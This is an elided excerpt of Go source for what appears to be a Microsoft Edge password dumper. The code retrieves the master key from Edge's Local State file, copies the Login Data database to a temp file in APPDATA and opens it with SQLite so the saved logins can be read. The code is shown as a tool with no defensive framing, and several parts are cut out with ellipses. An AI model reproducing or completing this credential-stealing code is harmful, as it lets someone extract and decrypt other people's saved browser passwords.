...
func getMasterKey() ([]byte, error) {
	...
	jsonFile, err := os.Open(localStatePathEdge) // The rough key is stored in the Local State File which is a json file
	if err != nil {
...
func main() {
	...
	if !checkFileExist(dataPathEdge) {
		os.Exit(0)
	}

	//Copy Login Data file to temp location
	err := copyFileToDirectory(dataPathEdge, os.Getenv("APPDATA")+"\\tempfile.dat")
	if err != nil {
		log.Fatal(err)
	}

	//Open Database
	db, err := sql.Open("sqlite", os.Getenv("APPDATA")+"\\tempfile.dat")
	if err != nil {
		log.Fatal(err)
	}
	defer db.Close()
